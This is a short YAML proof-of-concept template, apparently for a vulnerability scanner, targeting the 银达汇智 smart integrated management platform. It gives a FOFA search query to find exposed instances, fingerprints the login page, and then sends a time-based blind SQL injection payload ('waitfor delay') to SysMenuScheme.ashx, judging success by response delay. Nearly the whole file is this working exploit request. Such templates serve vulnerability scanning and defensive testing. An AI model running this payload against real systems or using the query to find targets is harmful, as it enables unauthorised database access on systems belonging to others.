id: poc-yaml-windor-icmp-sysmenuscheme-ashx-sqli
info:
  name: 银达汇智智慧综合管理平台 SysMenuScheme.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 银达汇智 智慧综合管理平台
  FOFA: 汇智信息 && title==智慧综合管理平台登入
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"智慧综合管理平台登入")
- method: POST
  path: /Module/Kernel/Controller/SysMenuScheme.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: action=exportExcel&sname='waitfor+delay'0:0:{{.t1}}'--
  expression: status_code == 200 && contains(headers,"SessionId") && body == "" &&
    duration > t1 && duration < t2
transport: http
